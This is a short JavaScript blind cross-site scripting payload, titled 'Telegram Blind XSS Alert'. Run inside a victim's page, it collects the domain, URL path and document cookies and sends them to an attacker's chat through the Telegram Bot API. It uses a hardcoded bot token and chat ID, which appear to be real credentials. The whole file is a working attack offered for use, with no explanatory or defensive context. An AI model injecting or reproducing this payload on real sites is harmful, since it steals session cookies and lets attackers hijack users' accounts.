var tokenBot = '6030941243:AAHbfjJ7bufGC6dZ1C5gc9jBf98T5A502G4'; // Your "tokenBot" Here
var chatId = '5776318525'; // Your "chatId" Here

/*
      _____    _          ___  
     |_   _|  | |    \ \ / / / _ \ 
       | | ___| | ___ \ V / / /_\ \
       | |/ _ \ |/ _ \/   \ |  _  |
       | |  / |  / /`\ \| | | |
       \_/\___|_|\___\/   \/\_| |_/
   ---- Telegram Blind XSS Alert ----
*/

function telegramSend(tokenBot, chatId) {
  var textData = '<b>bohay' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)
